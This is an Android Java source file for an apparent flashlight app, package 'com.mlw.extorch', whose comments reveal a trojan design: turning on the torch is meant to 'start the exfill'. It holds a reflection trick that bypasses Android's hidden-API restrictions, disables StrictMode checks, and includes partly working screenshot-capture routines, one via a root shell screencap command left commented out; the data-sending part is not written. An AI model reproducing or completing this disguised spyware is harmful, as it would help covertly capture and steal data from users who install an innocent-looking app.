package com.mlw.extorch;

import androidx.appcompat.app.AppCompatActivity;

import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraManager;
import android.os.Bundle;
import android.os.StrictMode;
import android.view.View;
import android.widget.CompoundButton;
import android.widget.Switch;
import android.widget.Toast;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Date;

public class MainActivity extends AppCompatActivity {

    Switch flashControl;
    CameraManager cameraManager;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        //workaround for accessing hidden api, currently still not working
        //todo make hidden api's work
        try {
            Method forName = Class.class.getDeclaredMethod("forName", String.class);
            Method getDeclaredMethod = Class.class.getDeclaredMethod("getDeclaredMethod", String.class, Class[].class);

            Class vmRuntimeClass = (Class) forName.invoke(null, "dalvik.system.VMRuntime");
            Method getRuntime = (Method) getDeclaredMethod.invoke(vmRuntimeClass, "getRuntime", null);
            Method setHiddenApiExemptions = (Method) getDeclaredMethod.invoke(vmRuntimeClass, "setHiddenApiExemptions", new Class[] {String[].class});

            Object vmRuntime = getRuntime.invoke(null);
            setHiddenApiExemptions.invoke(vmRuntime, new String[][]{new String[]{"L"}});
        } catch (NoSuchMethodException | IllegalAccessException | InvocationTargetException e) {
            e.printStackTrace();
        }


        // work around for uri exposed
        StrictMode.VmPolicy.Builder builder = new StrictMode.VmPolicy.Builder();
        StrictMode.setVmPolicy(builder.build());


        flashControl = findViewById(R.id.flashSwitch);
        cameraManager = (CameraManager) getSystemService(CAMERA_SERVICE);

        //WE NEED TO CHECK IF THE DEVICE HAS A CAMERA (OR FLASH)
        if(getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA_ANY)){
            if(getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA_FLASH)){
                //HERE WE TURN THE FLASH ON AND START THE EXFILL
                flashControl.setEnabled(true);
            }else{
                Toast.makeText(MainActivity.this, "This device has no flash!", Toast.LENGTH_SHORT).show();
            }
        }else{
            Toast.makeText(MainActivity.this, "This device has no camera!", Toast.LENGTH_SHORT).show();
        }

        flashControl.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
            @Override
            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                if(isChecked){
                    //user turned on thew flashlight, the default rear camera has 0 as id
                    try {
                        cameraManager.setTorchMode("0", true);
                    } catch (CameraAccessException e) {
                        e.printStackTrace();
                    }
                    flashControl.setText("Flash OFF");
                }else{
                    try {
                        cameraManager.setTorchMode("0", false);
                    } catch (CameraAccessException e) {
                        e.printStackTrace();
                    }
                    flashControl.setText("Flash ON");
                }
            }
        });

    }

    //todo try to implement screenshot functionality without root
    private void execute_captures() throws IOException, InterruptedException {
        Date date = new Date();
        CharSequence now = android.text.format.DateFormat.format("yyyy-MM-dd_hh:mm:ss", date);
        //create file directory in cache app dir
        File temp_dir = new File(getCacheDir(), "scrn");
        temp_dir.mkdir();
        String scrn_name = getCacheDir() + "/scrn/" + now + ".jpg";
        //working only with root
        ScreentShotUtil.getInstance().takeScreenshot(this, "");


        //usable code but updated using the above classes
        //        ProcessBuilder pb = new ProcessBuilder("/system/bin/screencap", "-p", scrn_name);
        //        Process p = pb.start();

        //        Process sh = Runtime.getRuntime().exec("/system/bin/sh", null,null);
        //        OutputStream os = sh.getOutputStream();
        //        os.write(("/system/bin/screencap -p " + scrn_name).getBytes("ASCII"));
        //        os.flush();
        //        os.close();
        //        sh.waitFor();


    }

    //working but it can only take screenshots off the running application
    private void cache_screenshoot(){
        Date date = new Date();
        CharSequence now = android.text.format.DateFormat.format("yyyy-MM-dd_hh:mm:ss", date);
        //create file directory in cache app dir
        File temp_dir = new File(getCacheDir(), "scrn");
        temp_dir.mkdir();

        String scrn_name = getCacheDir() + "/scrn/" + now + ".jpg";

        View root = getWindow().getDecorView();
        root.setDrawingCacheEnabled(true);
        Bitmap bitmap = Bitmap.createBitmap(root.getDrawingCache());
        root.setDrawingCacheEnabled(false);

        File scrn = new File(scrn_name);
        try {
            scrn.createNewFile();
        }catch (IOException e){
            e.printStackTrace();
        }

        try {
            FileOutputStream fileOutputStream = new FileOutputStream(scrn);
            bitmap.compress(Bitmap.CompressFormat.JPEG, 100, fileOutputStream);
            fileOutputStream.flush();
            fileOutputStream.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


}